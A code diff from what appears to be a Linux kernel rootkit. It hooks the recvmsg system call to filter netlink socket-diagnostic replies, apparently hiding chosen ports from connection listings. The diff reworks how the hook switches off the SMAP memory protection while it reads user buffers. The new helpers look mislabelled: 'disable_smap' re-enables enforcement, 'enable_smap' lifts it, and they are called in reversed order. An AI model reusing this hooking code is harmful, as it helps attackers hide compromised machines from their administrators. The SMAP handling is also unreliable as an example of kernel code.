@@ -3,6 +3,7 @@
 #include <net/inet_sock.h>
 #include <linux/inet_diag.h>
 #include <linux/byteorder/generic.h>
+#include <asm/smap.h>
 
 #include "common.h"
 #include "hook.h"
@@ -161,39 +162,16 @@ remove_port_from_list(port_list_t_ptr list, port_t port, proto proto)
     return ret;
 }
 
-//Cf. https://wiki.osdev.org/Supervisor_Memory_Protection
-static inline void cpu_flags_set_ac(void) {
-    // Set AC bit in RFLAGS register.
-    __asm__ volatile ("stac" ::: "cc"); 
+// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/smap.h#L58
+static inline void
+enable_smap(void) {
+    alternative("", __stringify(__ASM_STAC), X86_FEATURE_SMAP);
 }
 
-//Cf. https://wiki.osdev.org/Supervisor_Memory_Protection
-static inline void cpu_flags_clear_ac(void) {
-    // Clear AC bit in RFLAGS register.
-    __asm__ volatile ("clac" ::: "cc");
-}
-
-//Query CPUID
-//Intel SDM Vol. 2A 3-197 gives us what we need:
-//eax has to be 0x7, bit 20 is SMAP
-static int has_smap(void) {
-    int ret;
-
-    __asm__ volatile  ("movl $0x7, %%eax\t\n"
-                      "xor %%ecx, %%ecx\t\n"
-                      "cpuid\t\n"
-                      "movl $1, %%ecx\t\n"
-                      "shl $20, %%ecx\t\n"
-                      "and %%ecx, %%eax\t\n"
-                      "jz false%=\t\n"
-                      "movl $1, %0\t\n"
-                      "false%=:\t\n"
-                      "movl $0, %0"
-                      : "=r"(ret)
-                      :
-                      : "eax", "ebx", "ecx", "edx", "cc"); //forgetting the registers cpuid sets is painful..
-
-    return ret;
+// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/smap.h#L52
+static inline void
+disable_smap(void) {
+    alternative("", __stringify(__ASM_CLAC), X86_FEATURE_SMAP);
 }
 
 asmlinkage ssize_t
@@ -206,9 +184,7 @@ g7_recvmsg(struct pt_regs *pt_regs)
     if ((len = ret = sys_recvmsg(pt_regs)) < 0)
         return ret;
 
-    if(has_smap())
-       cpu_flags_set_ac();
-
+    disable_smap();
     nh = (struct nlmsghdr *)((struct user_msghdr *)pt_regs->si)->msg_iov->iov_base;
 
     while (nh && NLMSG_OK(nh, len)) {
@@ -227,9 +203,7 @@ g7_recvmsg(struct pt_regs *pt_regs)
             nh = NLMSG_NEXT(nh, len);
     }
 
-    if(has_smap())
-        cpu_flags_clear_ac();
-
+    enable_smap();
     return ret;
 }
 
